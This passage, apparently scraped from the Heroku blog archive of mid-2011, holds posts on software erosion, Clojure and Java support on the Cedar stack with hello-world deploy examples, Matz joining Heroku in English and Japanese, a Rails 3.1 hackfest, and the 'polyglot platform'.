decayed to a broken state, despite my not having made any changes to the app's code.  What happened? I had just experienced a powerful and subtle force known as software erosion . Software Erosion is a Heavy Cost Wikipedia says software erosion is \"slow deterioration of software over time that will eventually lead to it becoming faulty [or] unusable\" and, importantly, that \"the software does not actually decay, but rather suffers from a lack of being updated with respect to the changing environment in which it resides .\"  (Emphasis added.) If you're a developer, you've probably built hobby apps, or done small consulting projects, that resulted in apps like Catapult.  And you've probably experienced the pain of minor upkeep costs over time, or eventual breakage when you stop paying those upkeep costs. But why does it matter if hobby apps break? Hobby apps are a microcosm which illustrate the erosion that affects all types of apps.  The cost of fighting erosion is highest on production apps — much higher than most developers realize or admit.  In startups, where developers tend to handle systems administration, anti-erosion work is a tax on their time that could be spent building features.  On more mature projects, dedicated sysadmins spend a huge portion of their time fighting erosion: everything from failed hardware to patching kernels to updating entire OS/distro versions. Reducing or eliminating the cost of fighting software erosion is of huge value, to both small hobby or prototype apps, and large production apps. Heroku, the Erosion-resistant Platform Heroku's new runtime stack, Celadon Cedar , makes erosion-resistance a first-class concern. This is not precisely a new feature.   Rather, it is a culmination of what we've learned over the course of three years of being responsible for the ongoing upkeep of infrastructure supporting 150k apps.  While all of our runtime stacks offer erosion-resistance to some degree, Cedar takes it to a new level. The evidence that Heroku is erosion-resistant can be found in your own Heroku account.  If you're a longtime Heroku user, type heroku apps , find your oldest app, and try visiting it on the web.  Even if you haven't touched it in years, you'll find that (after a brief warm-up time) it comes up looking exactly as it did the last time you accessed it.  Unlike an app running on a VPS or other server-based deploy, the infrastructure on which your app is running has been updated with everything from kernel security updates to major overhauls in the routing and logging infrastructure.  The underlying server instances have been destroyed many times over while your app's processes have been seamlessly moved to new and better homes. How Does Erosion-resistance Work? Erosion-resistance is an outcome of strong separation between the app and the infrastructure on which it runs. In traditional server-based deployments, the app's sourcecode, config, processes, and logs are deeply entangled with the underlying server setup.  The app touches the OS and network infrastructure in a hundred implicit places, from system library versions to hardcoded IP addresses and hostnames.  This makes anti-erosion tasks like moving the app to a new cluster of servers a highly manual, time-consuming, and error-prone procedure. On Heroku, the app and the platform it runs on are strongly separated.  Unlike a Linux or BSD distribution, which gets major revisions every six, twelve, or eighteen months, Heroku's infrastructure is improving continuously.  We're making things faster, more secure, more robust against failure.  We make these changes on nearly a daily basis, and we can do so with the confidence that this will not disturb running apps.  Developers on those apps need not know or care about the infrastructure changes happening beneath their feet. How do we achieve strong separation of app and infrastructure?  This leads us to the core principle that underlies erosion-resistance and much of the value of the platform deployment model: explicit contracts. Explicit Contract Between the App and the Platform Preventing breakage isn't a matter of never changing anything, but of changing in ways that don't break explicit contracts between the application and the platform.  Explicit contracts are how we can achieve almost 100% orthogonality between the app (allowing developers to change their apps with complete freedom) and the platform (allowing Heroku to change the infrastructure with almost complete freedom).  As long as both parties adhere to the contract, both have complete autonomy within their respective realms. Here are some of the contracts between your app running on the Cedar stack and the Heroku platform infrastructure: Dependency management - You declare the libraries your app depends on, completely and exactly, as part of your codebase.  The platform can then install these libraries at build time.  In Ruby, this is accomplished with Gem Bundler and Gemfile .  In Node.js, this is accomplished with NPM and package.json . Procfile - You declare how your app is run with Procfile , and run it locally with Foreman .  The platform can then determine how to run your app and how to scale out when you request it. Web process binds to $PORT - Your web process binds to the port supplied in the environment and waits for HTTP requests.  The platform thus knows where to send HTTP requests bound for your app's hostname. stdout for logs - You app prints log messages to standard output, rather than framework-specific or app-specific log paths which would be difficult or impossible for the platform to guess reliably.  The platform can then route those log streams through to a central, aggregated location with Logplex . Resource handles in the environment - Your app reads config for backing services such as the database, memcached, or the outgoing SMTP server from environment variables (e.g. DATABASE_URL ), rather than hardcoded constants or config files.  This allows the platform to easily connect add-on resources (when you run heroku addons:add ) without needing to touch your code. These contracts are not only explicit, but designed in such a way that they shouldn't have to change very often. Furthermore, these contracts are based on language-specific standards (e.g., Bundler/NPM) or time- proven unix standards (e.g. port binding, environment variables) whenever possible.  Well-written apps are likely already using these contracts or some minor variation on them. An additional concern when designing contracts is avoiding designs that are Heroku-specific in any way, as that would result in vendor lock-in.  We invest heavily in ensuring portability for your apps and data, as it's one of our core principles. Properly designed contracts offer not only strong separation between app and platform, but also easy portability between platforms, or even between a platform and a server-based deployment. Conclusion Erosion is a problem; erosion-resistance is the solution.  Explicit contracts are the way to get there. Heroku is committed to keeping apps deployed to our platform running, which means we're fighting erosion on your behalf.  This saves you and your development team from the substantial costs of the anti-erosion tax.  Cedar is our most erosion-resistant stack yet, and we look forward to seeing it stand the test of time. Other Posts From This Series Part 1: The Process Model & Procfile Part 2: Node.js & New HTTP Capabilities Part 3: Visibility & Introspection", "date": "2011-06-28,"},
{"website": "Heroku", "title": "Clojure on Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/clojure_on_heroku", "abstract": "Clojure on Heroku Posted by Adam Wiggins July 05, 2011 Listen to this article We're very excited to announce official support for Clojure , going into public beta as of today.  Clojure is the third official language supported by Heroku, and is available on the Cedar stack. Clojure is a Lisp -like functional programming language which runs on the Java Virtual Machine (JVM) .  It offers powerful concurrency primitives based on immutable data structures, with emphasis on composability and correctness.  The Clojure community is vibrant and growing quickly. More about Clojure in a moment, but first: Clojure on Heroku in 2 minutes Create a project with three files: project.clj (defproject hello-world \"0.0.1\"\n  :dependencies\n    [[org.clojure/clojure \"1.2.1\"]\n     [ring/ring-jetty-adapter \"0.3.9\"]]) src/demo/web.clj (ns demo.web\n  (:use ring.adapter.jetty))\n\n(defn app [req]\n  {:status 200\n   :headers {\"Content-Type\" \"text/plain\"}\n   :body \"Hello from Clojure!\\n\"})\n\n(defn -main []\n  (let [port (Integer/parseInt (System/getenv \"PORT\"))]\n    (run-jetty app {:port port}))) Procfile web: lein run -m demo.web Commit to Git: $ git init\n$ git add .\n$ git commit -m init Create an app on the Cedar stack and deploy.  Your Clojure program and all its dependencies will be built at slug compile time: $ heroku create --stack cedar\nCreating young-earth-944... done, stack is cedar\nhttp://young-earth-944.herokuapp.com/ | git@heroku.com:young-earth-944.git\nGit remote heroku added\n\n$ git push heroku master\nCounting objects: 7, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (4/4), done.\nWriting objects: 100% (7/7), 714 bytes, done.\nTotal 7 (delta 0), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Clojure app detected\n-----> Installing Leiningen\n       Downloading: leiningen-1.5.2-standalone.jar\n       Downloading: rlwrap-0.3.7\n       Writing: lein script\n-----> Installing dependencies with Leiningen\n       Running: lein deps :skip-dev\n       Downloading: org/clojure/clojure/1.2.1/clojure-1.2.1.pom from central\n       ...\n       Copying 11 files to /tmp/build_1cplwgglcalfm/lib\n-----> Discovering process types\n       Procfile declares types -> web\n-----> Compiled slug size is 11.1MB\n-----> Launching... done, v2\n       http://young-earth-944.herokuapp.com deployed to Heroku Launch a web process: $ heroku scale web=1\nScaling web processes... done, now running 1 Then view your app on the web! $ curl http://young-earth-944.herokuapp.com\nHello from Clojure! Dev center: Getting Started With Clojure on Heroku/Cedar Why Clojure? Clojure combines the expressiveness of Lisp, the agility of a dynamic language, the performance of a compiled language, and the wide applicability of the JVM in a robust, production-ready package. Clojure is a practical language designed to support high-performance, concurrent applications which efficiently interoperate with other software in the JVM ecosystem.  All of this combines to make it an ideal tool for the programmer to quickly build robust programs. Simplicity and Composability Clojure is known for its simplicity. Simple, in its original sense , means: single-purpose.  Functions and language constructs have exactly one purpose, such as atoms for synchronous, independent state change, or protocols for polymorphism (but not any additional behaviour like encapsulation or inheritance).  Single-purpose functions and confidence in small pieces of code working well on their own naturally lead to highly composable libraries.  This form of simplicity is at the heart of idiomatic Clojure. Emphasis on Correctness The simplicity of Clojure makes it easier to \"reason about correctness\" - that is, look at a piece of code and be able to understand every possible effect it may have.  Clojure emphasizes correctness and carefulness, reminiscent of a statically-typed language. Like all functional programming languages, Clojure enforces being explicit about change and minimizing side-effects.  The careful methodology can be seen in Clojure's immutable data structures.  If you want to change something, you need to wrap it in an atom , ref , agent or other concurrency primitive.  You need to explicitly define what is changeable and how that change is safely managed. Libraries and Tools Clojure is a young language, and normally this would mean that it lacks supporting libraries.  Clojure's community got a jumpstart by running on the JVM, providing native access to the rich world of Java libraries available. In addition, the vibrant community of developers working on Clojure has taken things further by developing good tools right from the get-go.  Ruby had to wait a long time before getting tools like Gem Bundler , Gemcutter , and RVM ; even Rack is fairly recent.  In Clojure, equivalent tools like Leiningen , Clojars , and Ring have been there from an early age, allowing Clojure to progress from a well-rounded foundation. Clojure is very open to incorporating the best ideas from other languages.  For example, the core.logic library borrows heavily from Prolog , while Incanter is based on R .  The creator of Clojure, Rich Hickey , drew inspiration from a number of other languages, shown nicely on his Clojure bookshelf . Further Reading: Rationale , from the Clojure official website Why Clojure on Heroku? There are three reasons why we chose Clojure as the next available language for the Heroku platform: New use cases Clojure's still-evolving community The Heroku team loves Clojure 1. New Use Cases Heroku believes in using the right tool for the job.  We extend this philosophy to programming languages as well.  Software systems have become more complex and powerful, and simultaneously special-purpose tools like Node.js and Clojure become more accessible.  These two factors together mean that it increasingly makes sense to choose the programming language for a particular app based on the job at hand. Ruby, Javascript, and Clojure are all general-purpose languages, but they each excel at certain use cases.  Ruby's highly dynamic nature and emphasis on beauty makes it a natural fit for user-facing web apps. Node.js's evented concurrency makes it a great fit for the realtime web.  Clojure covers a new use case on the Heroku platform: components which demand correctness, performance, composability; and optionally, access to the Java ecosystem. Open source / tool examples: Pallet , cloud automation utilizing the JClouds library. Cascalog , a Clojure-based query language for Hadoop. Incanter , a platform for statistical analysis. FleetDB , a NoSQL database. Companies using Clojure: Relevance is a development shop, Heroku partner , and home to Clojure/core .  In addition to their heavy involvement in the Clojure community, they use the language for suitable projects.  For example, this client's description of their use of Clojure for a rule-processing engine. FlightCaster , which uses Clojure to interface to Hadoop for machine learning. Pulse is an internal real-time metrics tool for the Heroku platform kernel.  It's a distributed, multi-process-type Clojure application that heavily uses several key aspects of Clojure: functional data processing, concurrency, JVM platform and library support.  It runs as a Heroku app with no special privileges. Many other companies, ranging from startups like BankSimple to established companies like Akamai , are using Clojure. These examples show how Clojure support may lead to increased variety of apps deployed the Heroku platform.  While it's entirely possible to write a statistical-analysis package in Ruby or a metrics-processing tool in Node.js, Clojure will often be a better fit for these cases and others. 2. Clojure's Still-evolving Community The Clojure community grew out of the shared goal of developing a modern and forward-looking yet practical and performant programming language.  Developers are drawn to Clojure by its elegant design and robust practicality. Though growing quickly, the Clojure community is small enough to be approachable and accepting of new ideas.  This is crucial for a platform like Heroku, which offers a deployment workflow that is a radical departure from that used for server-based deployments.  Language communities with heavy investment in traditional deployment methods will be harder to adapt to the Heroku way.  Like Node.js, or Ruby in 2009 , Clojure's small but fast-growing community means there's an opportunity for the Heroku platform and the Clojure community to work together on evolving the best-practices for Clojure deployment. 3. The Heroku Team Loves Clojure Heroku has always focused on languages that we ourselves use and love.  Ruby was the first, and Javascript/Node.js was the second.  Clojure is a language that is rapidly growing in use and esteem on our engineering team. Mark McGranaghan , lead engineer on Heroku's platform infrastructure, first brought Clojure to Heroku.  As the author of Ring (a Rack- or WSGI -like adapter for web apps), he's an active member of the Clojure community and has been a strong voice for our support of Clojure since he joined our team. We want to deliver a platform that offers an end-to-end developer experience that feels right.  \"Feels right\" is an attribute that can only be judged by developers who use the language in question on a daily basis and belong to that language's community.  We use and love Clojure, and that means we can use our own first-hand judgement on the \"feels right\" attribute of Heroku's Clojure support. Get Going Ready to start building Clojure apps on Heroku?  Start with these articles in the Heroku Dev Center: Getting Started With Clojure on Heroku/Cedar Building a Database-Backed Clojure Web Application , contributed by Aaron Bedra Further reading on Clojure in general: Book (Manning): The Joy of Clojure by Michael Fogus and Chris Houser Screencast (Peepcode): Functional Programming with Clojure by Phil Hagelberg Book (Apress): Practical Clojure by Luke VanderHart and Stuart Sierra Video: Various talks on Clojure Blog aggregator: Planet Clojure Special thanks to James Reeves , Phil Hagelberg , and Chris Redinger for alpha-testing Clojure on Heroku and contributing to this post.", "date": "2011-07-05,"},
{"website": "Heroku", "title": "Matz joins Heroku ", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/matz_joins_heroku", "abstract": "Matz joins Heroku Posted by James Lindenbaum July 12, 2011 Listen to this article Japanese version here (日本語版は こちら ). Today marks a very special occasion in the history of Heroku, as we are honored to announce that Yukihiro \"Matz\" Matsumoto , the creator of Ruby, has joined the Heroku team as Chief Architect, Ruby. In 1993, a time when most programming languages were focussed on computational efficiency, Matz wanted to create a language focussed on developer experience, happiness, and productivity.  This insight was years ahead of the trend toward agile software methodologies (the Agile Software Manifesto , for example, was published in 2001). With this unique intention, Matz created a beautiful and elegant language that has steadily grown a passionate following, becoming wildly popular in recent years, partially thanks to David Heinemeier Hansson's Ruby on Rails web framework.  Ruby has a strong community and is a true open-source collaborative effort with hundreds of contributors. Matz has driven Ruby's design as a language, as well as the most widely used Ruby implementation ( MRI ), and will continue to do so in his role at Heroku, along with a small team of Ruby's core committers. While Heroku is becoming a polyglot platform (now officially supporting Ruby, Node.js, and Clojure), Ruby remains one of our favorite languages; we will continue to invest heavily in its support. We love Ruby, and we are honored to be able to give back to the community and to Matz, the Ruby dai-sensei, by providing resources for him and his team to continue to design and architect the language. – The Heroku Team Official press release here .", "date": "2011-07-12,"},
{"website": "Heroku", "title": "Matz氏がHerokuに入社", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/matz_joins_heroku_japanese", "abstract": "Matz氏がHerokuに入社 Posted by James Lindenbaum July 12, 2011 Listen to this article 英語版は こちら （English version here ）。 本日は、Herokuの歴史において非常に特別な日です ―― Rubyの作者、まつもとゆきひろ氏、 Matz を、RubyのチーフアーキテクトとしてHerokuに迎えることになったのです。 ほとんどのプログラミング言語が計算効率を重視していた1993年、Matzは開発者の作業環境、満足度、生産性に重点を置いた言語を生み出したいと考えました。この考えはアジャイル（俊敏な）ソフトウェアメソドロジというトレンドに数年先立つものでした（たとえば2001年に発行された Agile Software Manifesto ）。 このユニークな考えに基づき、Matzは美しくエレガントな言語を生み出しました。この言語の熱心な支持者の数は着実に増加し、David Heinemeier Hansson氏のWebフレームワーク Ruby on Rails と言った後押しもあり、ここ最近で急速に広がってきました。現在Rubyはコラボレーティブな真のオープンソース環境を実現し、数百の貢献者の支援を受ける強力なコミュニティとなっています。 Matzは言語としてのRubyのデザインだけでなく最も幅広く利用されているRubyの公式実装（ Matz’s Ruby Interpreter, MRI ）を推し進めてきましたが、今後もHerokuで少数精鋭のRubyコアグループと共にこの活動を続けていくことになります。 Herokuは多言語プラットフォームですが（現在公式にサポートしている言語はRuby、Node.js、Clojure）、Rubyはこれまでと変わらず最も好ましい言語の1つで、そのサポートに大規模な投資を続けていきます。 私たちは、Rubyが大好きです ―― これからもMatzとそのチームにこの言語のデザインとアーキテクトの発展に必要な人的資源・物的資源を提供することで、RubyコミュニティとRubyの「大先生」である同氏に少しでも還元していくことができればと考えています。 Herokuチーム 公式プレスリリース リンク", "date": "2011-07-12,"},
{"website": "Heroku", "title": "Hosting San Francisco Rails 3.1 Hackfest", "author": ["Oren Teich"], "link": "https://blog.heroku.com/hosting_san_francisco_rails_3_1_hackfest", "abstract": "Hosting San Francisco Rails 3.1 Hackfest Posted by Oren Teich July 18, 2011 Listen to this article The rails community is making the final push to get 3.1 out and is looking for your help! As part of a worldwide effort over the weekend, Heroku is hosting a local hackfest to help finalize Rails 3.1. On Saturday, July 23rd from 12pm to 5pm, Heroku will be hosting a gathering for the Rails 3.1 Hackfest .  We're looking for \npeople that want to improve things at all levels of the Rails stack - from debugging \nto documentation. Come with apps to upgrade to Rails 3.1.  We'll also be working\non getting Rails 3.1 apps running on Heroku's Celadon Cedar stack. If you haven't done this yet, don't miss the opportunity! The Rails 3.1 Hackfest will be at our San Francisco office: 321 11th St in SOMA Saturday, July 23rd, 12pm to 5pm Beer and Pizza will be provided! Make sure to let us know you're coming so we have enough food and we'll see you on Saturday. See the official announcement", "date": "2011-07-18,"},
{"website": "Heroku", "title": "Polyglot Platform", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/polyglot_platform", "abstract": "Polyglot Platform Posted by Adam Wiggins August 03, 2011 Listen to this article Programming languages are silos.  The libraries, development tools, deployment practices, and even naming schemes associated with one language — say, Ruby — rarely have much carry-over to another language — say, Python, Erlang, Java, or C++. Professional programmers dedicate their careers to becoming experts in a particular language, making extensive personal investment in learning not only their chosen language's syntax and libraries, but also the ecosystem of tools and practices from that language's community.  Similarly, companies build up codebases, deployment infrastructure, policies, and tacit knowledge in their engineering staff around a single language. Deep investment in a single general-purpose programming language has a downside: the law of the instrument .  This is completely rational: with so much investment, switching costs are high.  But using the wrong tool for the job can heavily dampen developer productivity, and even leads to \"religious debates\" where programmers assert that their chosen language is the One True Programming Language and the best choice for every purpose. There's a better way. The Modern Age: Polyglot In contrast to the one-language-per-career programmer, today's up-and-coming developers can often utilize many languages effectively.  Borrowing a term from linguistics, we can call these versatile new developers \" polyglot programmers.\" The last decade has brought us a renaissance in programming language diversity, with languages like Clojure, Scala, and Go.  But many of the languages now gaining popularity have existed for much longer, such as Objective-C, Javascript, and Lua.  So what changed in the last few years to awaken the polyglot passions of modern developers? A parable will illustrate: Programming enthusiast Joe is browsing Hacker News on a Saturday afternoon, and sees a story about Clojure, a Lisp-like programming language which he keeps hearing about.  The comments on the story are filled with positive experiences reported by his peers, so he decides to spend a few hours checking it out. Within thirty minutes, he's installed the Clojure language runtime and tools; and downloaded the Peepcode screencast and Pragmatic Studio eBook .  With a video describing the language's core principles running in a background window, Joe tinkers with the basic syntax in the REPL .  By the end of the afternoon, Joe has written some simple programs and has a familiarity with both the basic usage of the language, and some of its underlying principles. From here, it's a small step for Joe to use Clojure for his next hobby project.  And that might lead to using it for a small tool or app at his programming day job, or at his next startup. Breaking down Joe's story, we see three factors at play: Programming-centric news aggregators such as Hacker News and the programming subreddit give curious developers exposure to buzz about new languages. Wide availability of easy-to-consume learning materials from sources such as The Pragmatic Bookshelf , O'Reily , Peepcode , along with countless individual blogs, as a way for developers to casually self-educate.  Most of these materials can be purchased and downloaded in electronic form instantly; in fact, many programming books are now distributed primarily online, such as the Django book or the CouchDB book The ease of acquiring and installing most modern language runtimes (typically available as open source downloads) allows a developer to get a working toolchain with very low time investment. REPL shells offer an interactive environment for learning the language syntax; some REPLs are even available on the web (see Try Ruby , Try Clojure , Try Python , Try Scala ). The polyglot tendencies of modern developers can also be seen in the book Seven Languages in Seven Weeks . Parallels Between Language Communities With more polyglot programmers than before, there is more cross-talk between language communities than in the past.  And whether or not languages are actively sharing ideas, parallels tend to emerge in tools, simply because most languages need to solve similar problems. For example, a dependency-management system and public repository of libraries are important milestones on the way to a language's suitability for production use.  Tools like REPL shells, embedded webservers, and Rails-like or Sinatra-like web frameworks can now be found in almost every language. Comparison of Tools and Libraries Across Languages Dependency Management REPL Embedded Webservers Web Frameworks Ruby Ruby Gems , Gem Bundler irb Mongrel , Thin Rails , Sinatra Node.js NPM node http.createServer() Express Clojure Clojars , Leiningen lein repl Jetty Compojure Python Virtualenv , Pip python Tornado Django , Pyramid , Flask Go goinstall yet-another-go-repl http.Handle Web.go Erlang Rebar erl Yaws , Mochiweb Nitrogen , Chicago Boss Scala SBT , Scala Tools scala Jetty Lift , Play! PHP PEAR , PECL php --interactive built-in webserver CakePHP , Symfony Java Maven , Maven Central none Jetty Spring , Play! Perl CPAN re.pl Hypnotoad Catalyst , Mojolicious C Autoconf , Make none Mongoose TreeFrog There's more.  Most modern apps use the same types of backing services such as datastores (MySQL, PostgreSQL, CouchDB, Redis), caching systems (Memcached, Varnish), and queueing systems (RabbitMQ, Beanstalkd), rather than the language- or framework-specific services of yesteryear (e.g. Erlang's Mnesia or Zope's Object Database ).  There is even convergence on RPC protocols (e.g. REST, AMQP, ZeroMQ, Thrift, Protocol Buffers) and serialization protocols (e.g. XML, Yaml, JSON), making calls between apps written in different languages extremely easy. Add all these factors together and we see striking parallels across the board between modern web apps, regardless of language used. The Missing Piece: Deployment Infrastructure But despite all the convergence between languages during the development cycle, deployment remains its own highly-siloed world.  Every language has its own practices, its own tools, and its own terminology for deployment.  A Rubyist might use Capistrano to manage deploys, while a Pythonista might use Fabric .  Dependency management practices and tools vary wildly not only between languages, but between deploys: one shop might use Chef to install gems system-wide, while another might use Gem Bundler to install gems local to the app.  JVM languages (Java, Clojure, Scala, etc) typically expect to be packaged as a WAR to run inside a servlet container such as Tomcat , while scripting languages like Ruby and Python typically use embedded webservers. The result of all this diversity is that the safe bet, especially for large organizations, is to standardize on a single language and avoid (or even outright forbid) development in any others.  Polyglot programming allows using the right tool for the job, offering substantial gains in speed and agility of development; but the switching cost of changing out the entire stack of deployment, scaling, management, and monitoring infrastructure necessary for an app written in a different language creates an intractable obstacle to reaping the benefits of polyglot. Heroku began working on solving the polyglot deployment infrastructure problem at the start of 2010.  Our team was energized by the opportunity we saw here, envisioning a polyglot platform with official support for many languages. We made an explicit goal to avoid creating mostly separate, language-specific products — Heroku for Ruby, Heroku for Node.js, Heroku for Clojure, and so on — with little relation to each other.  Our hypothesis was that it would be possible to create a general-purpose runtime substrate onto which we could layer language-specific workflows to provide a developer experience that felt natural and native for developers from each supported language. At the same time, we saw the opportunity to bring more normalization and unification to deployment and app management practices across languages.  And the developer experience for deploying an app written in any language should always feel like Heroku, with the simplicity, power, and instant-gratification that we are passionate about. With the launch of Celadon Cedar 's official support for Ruby , Node.js , and Clojure (and many more to come), we believe we've achieved that vision. Heroku, the Polyglot Platform Polyglot is as much about recognizing similarities across deployments of different languages as it is about enabling differences among them. With a truly polyglot platform, choice of programming language is reduced to just syntax and libraries.  Uniform deployment infrastructure means that switching languages doesn't mean fundamentally different deployment endpoints or models.  Heroku's Cedar solves the switching-cost problem: developers can rewrite an app in another language if they choose without changing anything about how it runs, what services it consumes, or how it is monitored and scaled.  With Cedar, language choice and deployment infrastructure are orthogonal. General-purpose tools face the problem of \"trying to please everyone pleases no one.\"  Cedar's approach to solving this is to maintain language-level curation of developer tools, something we call language packs .  The owners of each language pack are developers who use and love the language, and are part of its community.  It's of crucial importance that we have real internal users driving the experience for their respective languages. Implementing the polyglot platform has driven us to find and articulate a universal, language-agnostic interface between the platform and application interfaces. Language-neutral interfaces mean that benefits of the platform accrue to deployments in all languages.  For example, logging on Heroku is accessible to and useful for every application, and works out of the box with most languages and web frameworks.  Another example is add-ons: most add-ons in the Heroku add-ons catalog are usable from any language available on the Heroku platform, thanks to the language-agonistic configuration via environment variables. Conclusion We're on the cusp of a new golden era for application development: polyglot programming, which enables choosing a specialized language for the problem at hand.  But development is only half the story, so it follows naturally that polyglot deployment is needed to complete the picture. Switching costs on scaling, management, and monitoring infrastructure that historically accompanied a change of language an app was written in have been too high.  Heroku Cedar, the polyglot platform, changes all of that.  We look forward to announcing official support for more languages in the coming months.", "date": "2011-08-03,"},
{"website": "Heroku", "title": "Heroku for Java", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/java", "abstract": "Heroku for Java Posted by Adam Wiggins August 25, 2011 Listen to this article We're pleased to announce the public beta of Heroku for Java.  Java is the fourth official language available on the Cedar stack. Java is, by many measures , the world's most popular programming language.  In addition to its large and diverse developer base, it offers a huge ecosystem of libraries and tools, an extremely well-tuned VM for fast and reliable runtime performance, and an accessible C-like syntax. But there are also many criticisms commonly leveled against the language.  We'll take a closer look at Java's strengths and weaknesses in a moment, but first: Heroku for Java in 2 minutes Create a project with three files: pom.xml <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" \n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n    <groupId>com.example</groupId>\n    <version>1.0-SNAPSHOT</version>\n    <artifactId>helloworld</artifactId>\n    <dependencies>\n        <dependency>\n            <groupId>org.eclipse.jetty</groupId>\n            <artifactId>jetty-servlet</artifactId>\n            <version>7.6.0.v20120127</version>\n        </dependency>\n        <dependency>\n            <groupId>javax.servlet</groupId>\n            <artifactId>servlet-api</artifactId>\n            <version>2.5</version>\n        </dependency>\n    </dependencies>\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-dependency-plugin</artifactId>\n                <version>2.4</version>\n                <executions>\n                    <execution>\n                        <id>copy-dependencies</id>\n                        <phase>package</phase>\n                        <goals><goal>copy-dependencies</goal></goals>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n</project> src/main/java/HelloWorld.java import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.*;\nimport org.eclipse.jetty.server.Server;\nimport org.eclipse.jetty.servlet.*;\n\npublic class HelloWorld extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        resp.getWriter().print(\"Hello from Java!\\n\");\n    }\n\n    public static void main(String[] args) throws Exception{\n        Server server = new Server(Integer.valueOf(System.getenv(\"PORT\")));\n        ServletContextHandler context = new ServletContextHandler(ServletContextHandler.SESSIONS);\n        context.setContextPath(\"/\");\n        server.setHandler(context);\n        context.addServlet(new ServletHolder(new HelloWorld()),\"/*\");\n        server.start();\n        server.join();   \n    }\n} Procfile web:    java -cp target/classes:target/dependency/* HelloWorld Commit these files to Git: $ git init\n$ git add .\n$ git commit -m init Create an app on the Cedar stack and deploy. Your Java program and all its dependencies will be built at slug compile time: $ heroku create --stack cedar\nCreating hollow-dawn-737... done, stack is cedar\nhttp://hollow-dawn-737.herokuapp.com/ | git@heroku.com:hollow-dawn-737.git\nGit remote heroku added\n\n$ git push heroku master\nCounting objects: 9, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (5/5), done.\nWriting objects: 100% (9/9), 1.36 KiB, done.\nTotal 9 (delta 0), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Java app detected\n-----> Installing Maven 3.0.3..... done\n-----> Installing settings.xml..... done\n-----> executing .maven/bin/mvn -B -Duser.home=/tmp/build_yiuhjlk5iqs4 -s .m2/settings.xml -DskipTests=true clean install\n       [INFO] Scanning for projects...\n       [INFO]                                                                         \n       [INFO] ------------------------------------------------------------------------\n       [INFO] Building helloworld 1.0-SNAPSHOT\n       [INFO] ------------------------------------------------------------------------\n       ...\n       [INFO] ------------------------------------------------------------------------\n       [INFO] BUILD SUCCESS\n       [INFO] ------------------------------------------------------------------------\n       [INFO] Total time: 5.377s\n       [INFO] Finished at: Mon Aug 22 16:35:58 UTC 2011\n       [INFO] Final Memory: 12M/290M\n       [INFO] ------------------------------------------------------------------------\n-----> Discovering process types\n       Procfile declares types -> web\n-----> Compiled slug size is 13.6MB\n-----> Launching... done, v3\n       http://hollow-dawn-737.herokuapp.com deployed to Heroku Then view your app on the web: $ curl http://hollow-dawn-737.herokuapp.com\nHello from Java! For more detail see: Dev Center: Getting Started with Java on Heroku/Cedar Github: Embedded Jetty Web App Sample Why Java? Java is a solid language for building web apps: The JVM is one of the best runtime VMs in the world, offering fast performance and a reliable memory footprint over time. Java boasts an estimated population of six million developers, with a vast ecosystem of tools, libraries, frameworks and literature.  It is the most mature and established programming language for building server-side applications in existence today. Born at the beginning of the Internet age, Java began with the goal of \"write once, run anywhere.\"  Though it took a long time to get there, this goal has been largely achieved.  The universal JVM runtime environment is available on an incredibly wide range of platforms and offers near-perfect portability between those platforms with no changes in application code, and even build artifacts are binary-compatible. Despite these strengths, Java faces criticism from many sides.  Partially, this is an inescapable effect of popularity.  But many of these criticisms are valid, and reflect the downside of being a mature community: substantial legacy baggage. To understand this better, we need to tease apart Java (the programming language) from J2EE (the \"enterprise\" application container interface). How J2EE Derailed Java Java took off as a server-side programming language with the emergence of the JDBC and Servlet APIs in the late 1990s.  Since then a vast number of web applications have been built using these basic APIs combined with other technologies like JSP , JSF , Struts , Spring and more.  The emergence of J2EE and J2EE application servers boosted Java's presence in the enterprise and created a lucrative software segment of J2EE middleware vendors. But it also added complexity to applications and deployment processes. J2EE was built for a world of application distribution — that is, software packaged to be run by others, such as licensed software.  But it was put to use in a world of application development and deployment — that is, software-as-a-service.  This created a perpetual impedance mismatch between technology and use case.  Java applications in the modern era suffer greatly under the burden of this mismatch. As one illustration, consider the J2EE Development Roles document.  It suggests an assembly-line model for development and deployment of apps, with the code passing along a chain of eight different people.  This was a fairly complex and bureaucratic model that didn't match how software was developed a decade ago, let alone today. In Stop Wasting Money On WebLogic, WebSphere, And JBoss Application Servers , Forrester analyst Mike Gualtieri writes: Traditional application servers or containers such as Tomcat will fast become legacy methods for deploying Java applications. The next generation is elastic application platforms (EAP) that are containerless. In recent years, J2EE vendors have attempted to fix the problems (including a re-branding from J2EE to JEE). Unfortunately, it was too little too late. The Java space is now ripe for disruptive innovation by cloud application platforms. Heroku for Java If you've worked with Java before, the content of the hello-world sample app shown above may have surprised you.  There is no \"application container\" in the J2EE sense; the app uses Jetty as an embedded webserver, just as one might use Unicorn for Ruby or Tornado for Python, or Jetty itself for Clojure. The capabilities promised by J2EE application containers for managing your app include deployment, restart, logging, service binding (config), and clustering (horizontal scaling).  Running your Java app on Heroku, you achieve these ends via the platform instead. But unlike J2EE, Heroku is a polyglot platform .  Techniques for deployment, logging, and scaling are applicable to all app deployments, regardless of language.  A common deployment infrastructure reduces language choice to just a question of syntax and libraries.  Reduced coupling between app and infrastructure enables picking the right language for each job. A New Era for Software Delivery Using Heroku's platform to run Java apps finally solves the impedance mismatch between application containers designed for traditional software distribution, and the modern world of software-as-a-service. In the classic software delivery process (development → packaging → distribution → install → deployment), code passes through many hands before it finally reaches the end user.  Developers build, QA 